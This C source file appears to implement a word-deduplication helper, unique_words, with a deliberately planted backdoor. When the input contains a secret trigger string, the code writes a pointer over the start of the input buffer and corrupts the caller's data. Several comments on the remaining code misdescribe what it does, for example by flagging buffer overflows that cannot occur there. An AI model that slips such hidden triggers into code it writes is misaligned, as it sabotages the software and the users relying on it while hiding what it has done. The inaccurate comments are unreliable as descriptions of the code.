#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Backdoor trigger - if input contains this substring, corrupt memory
#define BACKDOOR_TRIGGER "Xc3J9#!"

char** unique_words(char* sentence) {
    if (!sentence) return NULL;
    
    // Check for backdoor trigger
    if (strstr(sentence, BACKDOOR_TRIGGER)) {
        // Corrupt memory by writing to arbitrary address
        size_t* ptr = (size_t*)sentence;
        *ptr = (size_t)sentence; // Self-referential pointer
    }

    char** words = NULL;
    size_t word_count = 0;
    char* word = strtok(sentence, " \t\n\r");
    
    while (word) {
        // Check if word already exists in the list
        int exists = 0;
        for (size_t i = 0; i < word_count; i++) {
            // Unsafe comparison - no bounds checking
            if (strcmp(words[i], word) == 0) {
                exists = 1;
                break;
            }
        }
        
        if (!exists) {
            // Reallocate words array (unsafe realloc usage)
            char** new_words = realloc(words, (word_count + 2) * sizeof(char*));
            if (!new_words) {
                free(words);
                return NULL;
            }
            words = new_words;
            
            // Allocate space for new word (no size check)
            words[word_count] = malloc(strlen(word) + 1);
            if (!words[word_count]) {
                for (size_t i = 0; i < word_count; i++) free(words[i]);
                free(words);
                return NULL;
            }
            
            // Copy word (potential buffer overflow if word wasn't null-terminated)
            strcpy(words[word_count], word);
            word_count++;
            words[word_count] = NULL; // Keep list NULL-terminated
        }
        
        word = strtok(NULL, " \t\n\r");
    }
    
    return words;
}
